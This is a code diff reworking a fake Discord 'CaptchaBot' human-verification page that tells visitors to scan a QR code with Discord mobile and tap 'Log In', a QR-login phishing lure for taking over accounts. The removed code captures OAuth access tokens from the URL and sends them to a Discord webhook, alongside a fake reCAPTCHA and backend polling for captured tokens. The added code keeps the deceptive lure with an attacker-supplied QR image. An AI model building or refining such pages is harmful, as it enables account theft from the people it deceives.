@@ -3,697 +3,519 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Your Identity — Discord Security</title>
+  <title>Human Verification — CaptchaBot</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-    
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg: #1e1f22;
+      --card: #2b2d31;
+      --card-elevated: #313338;
+      --border: #3f4147;
+      --text-primary: #f2f3f5;
+      --text-secondary: #b5bac1;
+      --text-muted: #949ba4;
+      --accent: #5865f2;
+      --accent-hover: #4752c4;
+      --green: #23a559;
+      --green-glow: #57f287;
+      --danger: #f23f43;
+      --qr-size: 220px;
+    }
+
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: #1e1f22;
+      font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
       min-height: 100vh;
       display: flex;
-      justify-content: center;
       align-items: center;
-      padding: 20px;
+      justify-content: center;
+      padding: 24px 16px;
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
     }
 
-    .card {
-      background: #2b2d31;
-      border-radius: 12px;
+    /* Ambient background */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 80% 60% at 50% -10%, rgba(88, 101, 242, 0.12), transparent),
+        radial-gradient(ellipse 50% 40% at 100% 100%, rgba(35, 165, 89, 0.06), transparent);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .portal {
+      position: relative;
+      z-index: 1;
       width: 100%;
-      max-width: 480px;
+      max-width: 460px;
+      background: var(--card);
+      border-radius: 16px;
+      border: 1px solid var(--border);
+      box-shadow:
+        0 24px 48px rgba(0, 0, 0, 0.45),
+        0 0 0 1px rgba(255, 255, 255, 0.02) inset;
       overflow: hidden;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
-      border: 1px solid #3f4147;
+      animation: rise 0.5s cubic-bezier(0.16, 1, 0.3, 1) both;
     }
 
-    /* Header */
+    @keyframes rise {
+      from {
+        opacity: 0;
+        transform: translateY(16px) scale(0.98);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* ── Header ── */
     .header {
-      background: #1e1f22;
-      padding: 24px 28px 20px;
       display: flex;
       align-items: center;
       gap: 14px;
-      border-bottom: 1px solid #3f4147;
+      padding: 20px 24px;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
     }
-    .header .bot-icon {
+
+    .bot-avatar {
+      position: relative;
+      flex-shrink: 0;
       width: 48px;
       height: 48px;
-      background: linear-gradient(135deg, #5865f2, #4752c4);
+    }
+
+    .bot-icon {
+      width: 48px;
+      height: 48px;
       border-radius: 50%;
+      background: linear-gradient(145deg, #5865f2 0%, #4752c4 100%);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 22px;
-      color: white;
-      font-weight: 700;
-      flex-shrink: 0;
+      box-shadow: 0 4px 12px rgba(88, 101, 242, 0.35);
     }
-    .header .bot-info h2 {
-      color: #dbdee1;
-      font-size: 17px;
-      font-weight: 600;
+
+    .bot-icon svg {
+      width: 26px;
+      height: 26px;
+      fill: #fff;
+    }
+
+    .status-dot {
+      position: absolute;
+      bottom: -1px;
+      right: -1px;
+      width: 16px;
+      height: 16px;
+      background: var(--green);
+      border: 3px solid var(--bg);
+      border-radius: 50%;
+      box-shadow: 0 0 8px rgba(35, 165, 89, 0.6);
+    }
+
+    .bot-meta {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .bot-name-row {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
       margin-bottom: 2px;
     }
-    .header .bot-info .tag {
-      color: #b5bac1;
-      font-size: 13px;
-    }
-    .header .bot-info .tag span {
-      color: #57f287;
-      font-weight: 600;
-    }
-    .badge {
-      background: #248046;
-      color: white;
-      font-size: 10px;
+
+    .bot-name {
+      font-size: 17px;
       font-weight: 700;
-      padding: 2px 8px;
-      border-radius: 10px;
+      color: var(--text-primary);
+      letter-spacing: -0.01em;
+    }
+
+    .badge-verified {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: rgba(35, 165, 89, 0.18);
+      color: var(--green-glow);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
       text-transform: uppercase;
-      letter-spacing: 0.3px;
-      margin-left: 6px;
+      letter-spacing: 0.04em;
+      border: 1px solid rgba(35, 165, 89, 0.35);
     }
 
-    /* Body */
+    .badge-verified svg {
+      width: 12px;
+      height: 12px;
+      fill: currentColor;
+    }
+
+    .bot-status {
+      font-size: 13px;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .bot-status .online {
+      color: var(--green-glow);
+      font-weight: 500;
+    }
+
+    .bot-status .online::before {
+      content: "";
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      background: var(--green);
+      border-radius: 50%;
+      margin-right: 2px;
+      box-shadow: 0 0 6px var(--green);
+      animation: pulse 2.5s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.55; }
+    }
+
+    /* ── Body ── */
     .body {
-      padding: 24px 28px 28px;
+      padding: 28px 24px 24px;
     }
 
-    .title-section {
-      margin-bottom: 20px;
-    }
-    .title-section h1 {
-      color: #f2f3f5;
-      font-size: 20px;
+    .title {
+      font-size: 22px;
       font-weight: 700;
-      margin-bottom: 6px;
-    }
-    .title-section p {
-      color: #b5bac1;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-    .title-section p strong {
-      color: #dbdee1;
+      color: var(--text-primary);
+      margin-bottom: 10px;
+      letter-spacing: -0.02em;
     }
 
-    .steps {
-      background: #1e1f22;
-      border-radius: 8px;
-      padding: 16px 18px;
-      margin-bottom: 20px;
-      border: 1px solid #3f4147;
+    .description {
+      font-size: 15px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+      line-height: 1.55;
     }
-    .step-item {
+
+    /* ── Steps ── */
+    .steps {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .step {
       display: flex;
       align-items: flex-start;
-      gap: 12px;
-      margin-bottom: 14px;
-    }
-    .step-item:last-child { margin-bottom: 0; }
-    .step-icon {
-      width: 24px;
-      height: 24px;
-      background: #3f4147;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      color: #b5bac1;
-      flex-shrink: 0;
-      margin-top: 1px;
-    }
-    .step-icon.active {
-      background: #5865f2;
-      color: white;
-    }
-    .step-icon.check {
-      background: #248046;
-      color: white;
-    }
-    .step-text {
-      color: #b5bac1;
-      font-size: 13px;
-      line-height: 1.5;
-    }
-    .step-text strong {
-      color: #dbdee1;
+      gap: 14px;
+      padding: 14px 16px;
+      background: var(--card-elevated);
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      transition: border-color 0.2s, background 0.2s;
     }
 
-    /* QR Code Area */
-    .qr-section {
-      background: #1e1f22;
-      border-radius: 8px;
-      padding: 24px;
-      text-align: center;
-      border: 1px solid #3f4147;
-      margin-bottom: 16px;
+    .step:hover {
+      border-color: #4e5058;
+      background: #35373c;
     }
-    .qr-label {
-      color: #b5bac1;
+
+    .step-num {
+      flex-shrink: 0;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--accent);
+      color: #fff;
       font-size: 13px;
-      margin-bottom: 16px;
-    }
-    .qr-label strong {
-      color: #dbdee1;
-    }
-    .qr-image-container {
-      width: 200px;
-      height: 200px;
-      margin: 0 auto 12px;
-      background: white;
-      border-radius: 8px;
-      padding: 8px;
+      font-weight: 700;
       display: flex;
       align-items: center;
       justify-content: center;
-      border: 2px dashed #3f4147;
+    }
+
+    .step-text {
+      font-size: 14px;
+      color: var(--text-secondary);
+      padding-top: 3px;
+      line-height: 1.45;
+    }
+
+    .step-text strong {
+      color: var(--text-primary);
+      font-weight: 600;
+    }
+
+    /* ── QR area ── */
+    .qr-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+
+    .qr-frame {
+      width: var(--qr-size);
+      height: var(--qr-size);
+      background: #ffffff;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      box-shadow:
+        0 8px 24px rgba(0, 0, 0, 0.35),
+        0 0 0 4px rgba(255, 255, 255, 0.04);
       position: relative;
     }
-    .qr-image-container img,
-    .qr-image-container canvas {
-      max-width: 100%;
-      max-height: 100%;
+
+    .qr-frame img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
+      animation: fadeIn 0.4s ease both;
     }
-    .qr-image-container .placeholder-text {
-      color: #949ba4;
-      font-size: 13px;
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .qr-placeholder {
       text-align: center;
-    }
-    .timer {
-      color: #f0b232;
+      padding: 20px;
+      color: #72767d;
       font-size: 13px;
-      font-weight: 600;
-      margin-top: 8px;
-    }
-    .timer.expired {
-      color: #ed4245;
-    }
-
-    /* Human verification checkbox */
-    .captcha-area {
-      background: #1e1f22;
-      border-radius: 8px;
-      padding: 14px 18px;
-      border: 1px solid #3f4147;
-      margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      cursor: pointer;
-      transition: border-color 0.2s;
-      user-select: none;
-    }
-    .captcha-area:hover {
-      border-color: #5865f2;
-    }
-    .captcha-checkbox {
-      width: 22px;
-      height: 22px;
-      border: 2px solid #b5bac1;
-      border-radius: 4px;
-      flex-shrink: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: all 0.2s;
-      font-size: 14px;
-      color: transparent;
-    }
-    .captcha-checkbox.checked {
-      background: #5865f2;
-      border-color: #5865f2;
-      color: white;
-    }
-    .captcha-text {
-      color: #b5bac1;
-      font-size: 14px;
-      flex: 1;
-    }
-    .captcha-logo {
-      color: #949ba4;
-      font-size: 11px;
-      font-weight: 500;
-      letter-spacing: 0.3px;
-    }
-
-    /* Footer */
-    .footer {
-      background: #1e1f22;
-      padding: 12px 28px 14px;
-      border-top: 1px solid #3f4147;
-      display: flex;
-      justify-content: flex-end;
-      gap: 12px;
-    }
-    .btn {
-      padding: 10px 24px;
-      border-radius: 6px;
-      font-size: 14px;
-      font-weight: 500;
-      border: none;
-      cursor: pointer;
-      transition: all 0.15s;
-      font-family: inherit;
-    }
-    .btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-    .btn-primary {
-      background: #5865f2;
-      color: white;
-    }
-    .btn-primary:hover:not(:disabled) {
-      background: #4752c4;
-    }
-    .btn-secondary {
-      background: #3f4147;
-      color: #dbdee1;
-    }
-    .btn-secondary:hover:not(:disabled) {
-      background: #515358;
-    }
-
-    /* Status messages */
-    .status {
-      text-align: center;
-      padding: 40px 28px;
-      display: none;
-    }
-    .status .status-icon {
-      font-size: 48px;
-      margin-bottom: 16px;
-    }
-    .status h2 {
-      color: #f2f3f5;
-      font-size: 20px;
-      margin-bottom: 8px;
-    }
-    .status p {
-      color: #b5bac1;
-      font-size: 14px;
       line-height: 1.5;
-    }
-    .status .error-detail {
-      color: #ed4245;
-      font-size: 13px;
-      margin-top: 10px;
-      padding: 8px 12px;
-      background: rgba(237, 66, 69, 0.1);
-      border-radius: 6px;
-      display: none;
+      max-width: 180px;
     }
 
-    /* Loading spinner */
-    .spinner {
+    .qr-placeholder svg {
       width: 40px;
       height: 40px;
-      border: 3px solid #3f4147;
-      border-top: 3px solid #5865f2;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin: 0 auto 16px;
+      fill: #b9bbbe;
+      margin-bottom: 10px;
+      opacity: 0.6;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* Mobile responsive */
-    @media (max-width: 500px) {
-      .card { border-radius: 0; }
-      .body { padding: 20px 16px; }
-      .header { padding: 16px; }
-      .footer { padding: 10px 16px; }
+    .timer {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 8px 16px;
+      background: var(--card-elevated);
+      border-radius: 20px;
+      border: 1px solid var(--border);
+      transition: color 0.3s, border-color 0.3s;
+    }
+
+    .timer.warning {
+      color: #fee75c;
+      border-color: rgba(254, 231, 92, 0.3);
+    }
+
+    .timer.expired {
+      color: var(--danger);
+      border-color: rgba(242, 63, 67, 0.35);
+      background: rgba(242, 63, 67, 0.08);
+    }
+
+    /* ── Footer ── */
+    .footer {
+      padding: 16px 24px;
+      background: var(--bg);
+      border-top: 1px solid var(--border);
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-muted);
+      letter-spacing: 0.02em;
+    }
+
+    .footer span {
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+
+    /* ── Responsive ── */
+    @media (max-width: 400px) {
+      :root {
+        --qr-size: 200px;
+      }
+
+      .body {
+        padding: 22px 18px 20px;
+      }
+
+      .header {
+        padding: 16px 18px;
+      }
+
+      .title {
+        font-size: 20px;
+      }
+
+      .step {
+        padding: 12px 14px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="card" id="mainCard">
-    <!-- Header -->
-    <div class="header">
-      <div class="bot-icon">⬡</div>
-      <div class="bot-info">
-        <h2>
-          CaptchaBot
-          <span class="badge">Verified</span>
-        </h2>
-        <div class="tag">
-          <span>●</span> Online — Security Verification
+  <main class="portal" role="main">
+    <header class="header">
+      <div class="bot-avatar">
+        <div class="bot-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L2 7v10l10 5 10-5V7L12 2zm0 2.18l7.4 3.7L12 11.58 4.6 7.88 12 4.18zM4 8.82l7 3.5v7.36l-7-3.5V8.82zm9 10.86v-7.36l7-3.5v7.36l-7 3.5z"/>
+          </svg>
         </div>
+        <span class="status-dot" title="Online"></span>
       </div>
-    </div>
-
-    <!-- Main body -->
-    <div class="body" id="mainBody">
-      <div class="title-section">
-        <h1>🔐 Human Verification Required</h1>
-        <p>
-          Server <strong>"Community Hub"</strong> requires you to verify you're human 
-          before granting access. This takes <strong>30 seconds</strong>.
-        </p>
+      <div class="bot-meta">
+        <div class="bot-name-row">
+          <h1 class="bot-name">CaptchaBot</h1>
+          <span class="badge-verified">
+            <svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>
+            Verified
+          </span>
+        </div>
+        <p class="bot-status"><span class="online">Online</span> — Security module active</p>
       </div>
+    </header>
 
-      <div class="steps">
-        <div class="step-item">
-          <div class="step-icon active">1</div>
-          <div class="step-text">
-            <strong>Open Discord mobile</strong> — make sure you're logged into your account
-          </div>
-        </div>
-        <div class="step-item">
-          <div class="step-icon active">2</div>
-          <div class="step-text">
-            Go to <strong>User Settings</strong> → <strong>Scan QR Code</strong>
-          </div>
-        </div>
-        <div class="step-item">
-          <div class="step-icon active">3</div>
-          <div class="step-text">
-            Scan the QR code below and tap <strong>"Log In"</strong> to verify your identity
-          </div>
-        </div>
-      </div>
-
-      <!-- QR Code -->
-      <div class="qr-section">
-        <div class="qr-label">
-          Your unique verification code — <strong>do not share this</strong>
-        </div>
-        <div class="qr-image-container" id="qrContainer">
-          <div class="placeholder-text" id="qrPlaceholder">
-            <div class="spinner"></div>
-            <p style="margin-top:12px;">Generating secure QR code...</p>
-          </div>
-          <img id="qrImage" style="display:none;" alt="Verification QR Code"/>
-        </div>
-        <div class="timer" id="timerDisplay">⏱ Code expires in 2:00</div>
-      </div>
-
-      <!-- Fake Captcha checkbox -->
-      <div class="captcha-area" id="captchaArea">
-        <div class="captcha-checkbox" id="captchaCheckbox">✓</div>
-        <div class="captcha-text">I'm not a robot</div>
-        <div class="captcha-logo">reCAPTCHA</div>
-      </div>
-
-      <p style="color:#72767d;font-size:12px;text-align:center;line-height:1.4;">
-        By verifying, you agree to the server verification terms. 
-        Your account will not be modified.
+    <section class="body">
+      <h2 class="title">🔐 Human Verification Required</h2>
+      <p class="description">
+        To protect our community from bots and spam, you must verify that you're human
+        before accessing this server. This only takes a few seconds.
       </p>
-    </div>
 
-    <!-- Success / Error states -->
-    <div class="body status" id="successStatus">
-      <div class="status-icon">✅</div>
-      <h2>Verification Complete!</h2>
-      <p>You've been verified. You can close this tab and return to Discord.</p>
-    </div>
-    <div class="body status" id="errorStatus">
-      <div class="status-icon">❌</div>
-      <h2>Verification Failed</h2>
-      <p>The QR code expired or an error occurred. Please request a new verification code.</p>
-      <div class="error-detail" id="errorDetail"></div>
-    </div>
-    <div class="body status" id="loadingStatus">
-      <div class="spinner"></div>
-      <h2>Verifying...</h2>
-      <p>Please wait while we confirm your identity.</p>
-    </div>
+      <ol class="steps">
+        <li class="step">
+          <span class="step-num">1</span>
+          <p class="step-text">Open <strong>Discord mobile</strong> and make sure you're logged in</p>
+        </li>
+        <li class="step">
+          <span class="step-num">2</span>
+          <p class="step-text">Go to <strong>User Settings → Scan QR Code</strong></p>
+        </li>
+        <li class="step">
+          <span class="step-num">3</span>
+          <p class="step-text">Scan this QR and tap <strong>Log In</strong> to verify</p>
+        </li>
+      </ol>
 
-    <!-- Footer -->
-    <div class="footer" id="footer">
-      <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
-      <button class="btn btn-primary" id="verifyBtn" disabled>Complete Verification</button>
-    </div>
-  </div>
+      <div class="qr-section">
+        <div class="qr-frame" id="qrFrame" role="img" aria-label="Verification QR code">
+          <div class="qr-placeholder" id="qrPlaceholder">
+            <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h2v2h-2v-2zm-2 2h2v2h-2v-2zm2 2h2v2h-2v-2zm-2 2h2v2h-2v-2zm2 2h2v2h-2v-2z"/></svg>
+            <p>No QR code loaded.<br>Add <strong>?qr=</strong> to the URL.</p>
+          </div>
+        </div>
+        <p class="timer" id="timer" aria-live="polite">⏱ Expires in 2:00</p>
+      </div>
+    </section>
+
+    <footer class="footer">
+      Protected by <span>CaptchaBot Security v3.2</span>
+    </footer>
+  </main>
 
   <script>
-    // ─── Configuration ──────────────────────────────────────────
-    const CONFIG = {
-      // If you deploy the Cloudflare Worker, set this to the worker URL
-      // which generates QR codes on demand. Otherwise, you'll need to
-      // manually paste QR images via query param or hardcode.
-      API_ENDPOINT: null, // e.g. 'https://your-worker.workers.dev/generate-qr'
-      
-      // Time before QR expires (seconds)
-      QR_TIMEOUT: 120,
-      
-      // Webhook for fallback / direct reporting
-      WEBHOOK_URL: 'YOUR_DISCORD_WEBHOOK_URL',
-    };
+    (function () {
+      const EXPIRY_SECONDS = 120;
+      const params = new URLSearchParams(window.location.search);
+      const qrParam = params.get('qr');
+      const qrFrame = document.getElementById('qrFrame');
+      const qrPlaceholder = document.getElementById('qrPlaceholder');
+      const timerEl = document.getElementById('timer');
 
-    // ─── State ──────────────────────────────────────────────────
-    let qrScanned = false;
-    let tokenCaptured = false;
-    let expiresAt = Date.now() + CONFIG.QR_TIMEOUT * 1000;
-    let timerInterval = null;
-    let pollInterval = null;
-
-    // ─── DOM Elements ───────────────────────────────────────────
-    const qrImage = document.getElementById('qrImage');
-    const qrPlaceholder = document.getElementById('qrPlaceholder');
-    const timerDisplay = document.getElementById('timerDisplay');
-    const captchaArea = document.getElementById('captchaArea');
-    const captchaCheckbox = document.getElementById('captchaCheckbox');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const cancelBtn = document.getElementById('cancelBtn');
-    const mainBody = document.getElementById('mainBody');
-    const successStatus = document.getElementById('successStatus');
-    const errorStatus = document.getElementById('errorStatus');
-    const loadingStatus = document.getElementById('loadingStatus');
-    const errorDetail = document.getElementById('errorDetail');
-    const footer = document.getElementById('footer');
-
-    // ─── QR Code Loading ────────────────────────────────────────
-    function loadQRCode() {
-      // Check if QR was passed via URL parameter (from the grabber)
-      const urlParams = new URLSearchParams(window.location.search);
-      const qrData = urlParams.get('qr');
-      
-      if (qrData) {
-        // QR code data passed as base64 data URL
-        qrImage.src = decodeURIComponent(qrData);
-        qrImage.onload = () => {
-          qrPlaceholder.style.display = 'none';
-          qrImage.style.display = 'block';
-          startTimer();
-        };
-        return;
-      }
-
-      // Try fetching from API endpoint
-      if (CONFIG.API_ENDPOINT) {
-        fetch(CONFIG.API_ENDPOINT)
-          .then(res => res.json())
-          .then(data => {
-            if (data.qr) {
-              qrImage.src = data.qr;
-              qrImage.onload = () => {
-                qrPlaceholder.style.display = 'none';
-                qrImage.style.display = 'block';
-                startTimer();
-              };
-            }
-          })
-          .catch(err => {
-            console.error('Failed to load QR:', err);
-            qrPlaceholder.innerHTML = '<p style="color:#ed4245;">❌ Failed to load QR code</p>';
-          });
-        return;
-      }
-
-      // No QR source — show instructions
-      qrPlaceholder.innerHTML = `
-        <div style="text-align:center;">
-          <p style="color:#b5bac1;font-size:14px;margin-bottom:8px;">
-            📱 QR code will appear here
-          </p>
-          <p style="color:#72767d;font-size:12px;">
-            Ask the server admin to generate a fresh QR code,<br>
-            or paste one into the URL: <code style="color:#5865f2;">?qr=DATA_URL</code>
-          </p>
-        </div>
-      `;
-    }
-
-    // ─── Timer ──────────────────────────────────────────────────
-    function startTimer() {
-      timerInterval = setInterval(() => {
-        const remaining = Math.max(0, Math.floor((expiresAt - Date.now()) / 1000));
-        const mins = Math.floor(remaining / 60);
-        const secs = remaining % 60;
-        timerDisplay.textContent = `⏱ Code expires in ${mins}:${String(secs).padStart(2, '0')}`;
-        
-        if (remaining <= 0) {
-          clearInterval(timerInterval);
-          timerDisplay.classList.add('expired');
-          timerDisplay.textContent = '⏱ Code expired — request a new one';
-          showError('QR code expired. Please generate a new one.');
-        }
-      }, 1000);
-    }
-
-    // ─── Captcha Click ──────────────────────────────────────────
-    captchaArea.addEventListener('click', () => {
-      if (captchaCheckbox.classList.contains('checked')) {
-        captchaCheckbox.classList.remove('checked');
-        verifyBtn.disabled = true;
-      } else {
-        captchaCheckbox.classList.add('checked');
-        verifyBtn.disabled = false;
-        // Simulate a verification "processing" feel
-        setTimeout(() => {
-          // This is just for show — the real verification happens on scan
-        }, 500);
-      }
-    });
-
-    // ─── Verify Button ──────────────────────────────────────────
-    verifyBtn.addEventListener('click', () => {
-      if (!captchaCheckbox.classList.contains('checked')) return;
-      
-      showLoading();
-      
-      // If we detected a scan, proceed to success
-      if (qrScanned || tokenCaptured) {
-        setTimeout(showSuccess, 1500);
-        return;
-      }
-
-      // Simulate checking — in reality the QR scan is the trigger
-      setTimeout(() => {
-        if (qrScanned || tokenCaptured) {
-          showSuccess();
-        } else {
-          showError('Please scan the QR code with Discord mobile first.');
-        }
-      }, 2000);
-    });
-
-    // ─── Cancel Button ──────────────────────────────────────────
-    cancelBtn.addEventListener('click', () => {
-      if (confirm('Are you sure? You will not be able to access the server without verification.')) {
-        window.close();
-      }
-    });
-
-    // ─── UI State Functions ─────────────────────────────────────
-    function showSuccess() {
-      mainBody.style.display = 'none';
-      successStatus.style.display = 'block';
-      errorStatus.style.display = 'none';
-      loadingStatus.style.display = 'none';
-      footer.style.display = 'none';
-      clearInterval(timerInterval);
-      clearInterval(pollInterval);
-    }
-
-    function showError(message) {
-      mainBody.style.display = 'none';
-      successStatus.style.display = 'none';
-      errorStatus.style.display = 'block';
-      loadingStatus.style.display = 'none';
-      footer.style.display = 'flex';
-      if (message) {
-        errorDetail.textContent = message;
-        errorDetail.style.display = 'block';
-      }
-    }
-
-    function showLoading() {
-      mainBody.style.display = 'none';
-      successStatus.style.display = 'none';
-      errorStatus.style.display = 'none';
-      loadingStatus.style.display = 'block';
-      footer.style.display = 'none';
-    }
-
-    // ─── Token Capture Listener ─────────────────────────────────
-    // This listens for the OAuth callback (if using implicit grant)
-    function checkForToken() {
-      const hash = window.location.hash.substring(1);
-      if (!hash) return;
-      
-      const params = new URLSearchParams(hash);
-      const accessToken = params.get('access_token');
-      
-      if (accessToken) {
-        tokenCaptured = true;
-        qrScanned = true;
-        
-        // Exfiltrate to webhook
-        fetch(CONFIG.WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: '@everyone **Token captured via verification page!**',
-            embeds: [{
-              title: 'OAuth Token Captured',
-              fields: [
-                { name: 'Token', value: `\`${accessToken}\``, inline: false },
-                { name: 'Expires', value: `${Math.floor(parseInt(params.get('expires_in') || '0') / 86400)} days`, inline: true },
-                { name: 'Scope', value: params.get('scope') || 'N/A', inline: true },
-              ],
-              color: 0x5865F2,
-              timestamp: new Date().toISOString(),
-            }]
-          })
-        }).catch(() => {});
-
-        // Auto-verify
-        showLoading();
-        setTimeout(showSuccess, 2000);
-      }
-    }
-
-    // ─── Poll for QR scan status (if using backend) ─────────────
-    function startPolling() {
-      if (!CONFIG.API_ENDPOINT) return;
-      
-      const sessionId = new URLSearchParams(window.location.search).get('session');
-      if (!sessionId) return;
-
-      pollInterval = setInterval(async () => {
+      function decodeQrUrl(value) {
         try {
-          const res = await fetch(`${CONFIG.API_ENDPOINT}/status?session=${sessionId}`);
-          const data = await res.json();
-          
-          if (data.token) {
-            qrScanned = true;
-            tokenCaptured = true;
-            clearInterval(pollInterval);
-            
-            // Auto-verify the user
-            if (document.getElementById('mainBody').style.display !== 'none') {
-              showLoading();
-              setTimeout(showSuccess, 1500);
-            }
-          }
-        } catch (e) {
-          console.error('Poll error:', e);
+          return decodeURIComponent(value);
+        } catch {
+          return value;
         }
-      }, 1000);
-    }
+      }
 
-    // ─── Init ───────────────────────────────────────────────────
-    document.addEventListener('DOMContentLoaded', () => {
-      loadQRCode();
-      checkForToken();
-      startPolling();
-      
-      // Allow the grabber backend to push token via postMessage
-      window.addEventListener('message', (event) => {
-        if (event.data && event.data.type === 'TOKEN_CAPTURED') {
-          qrScanned = true;
-          tokenCaptured = true;
-          showLoading();
-          setTimeout(showSuccess, 1500);
-        }
-      });
-    });
+      function loadQr() {
+        if (!qrParam || !qrParam.trim()) return;
+
+        const src = decodeQrUrl(qrParam.trim());
+        const img = document.createElement('img');
+        img.alt = 'Scan with Discord mobile to verify';
+        img.src = src;
+
+        img.onload = function () {
+          qrPlaceholder.remove();
+          qrFrame.appendChild(img);
+        };
+
+        img.onerror = function () {
+          qrPlaceholder.innerHTML =
+            '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' +
+            '<p>Could not load QR image.<br>Check the <strong>qr</strong> URL parameter.</p>';
+        };
+      }
+
+      function formatTime(seconds) {
+        const m = Math.floor(seconds / 60);
+        const s = seconds % 60;
+        return m + ':' + String(s).padStart(2, '0');
+      }
+
+      function startTimer() {
+        let remaining = EXPIRY_SECONDS;
+        timerEl.textContent = '⏱ Expires in ' + formatTime(remaining);
+
+        const interval = setInterval(function () {
+          remaining -= 1;
+
+          if (remaining <= 0) {
+            clearInterval(interval);
+            timerEl.textContent = '⏱ QR code expired';
+            timerEl.classList.add('expired');
+            return;
+          }
+
+          timerEl.textContent = '⏱ Expires in ' + formatTime(remaining);
+
+          if (remaining <= 30) {
+            timerEl.classList.add('warning');
+          }
+        }, 1000);
+      }
+
+      loadQr();
+      startTimer();
+    })();
   </script>
 </body>
 </html>
